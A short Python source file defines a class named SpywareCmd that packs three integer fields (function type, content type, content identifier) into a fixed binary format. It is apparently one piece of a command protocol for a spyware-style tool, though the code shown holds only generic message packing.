import struct
from funCode import FunCode


class SpywareCmd:
    FMT: str = "=III"
    sizeof: int = struct.calcsize("=III")

    def __init__(self, FuncType: int, contType: int, contIdentifier: int) -> None:
        self.FuncType = FuncType
        self.contType = contType
        self.contIdentifier = contIdentifier

    def pack(self) -> bytes:
        return struct.pack(self.FMT, self.FuncType, self.contType, self.contIdentifier)

    # maybe add an unpacking method
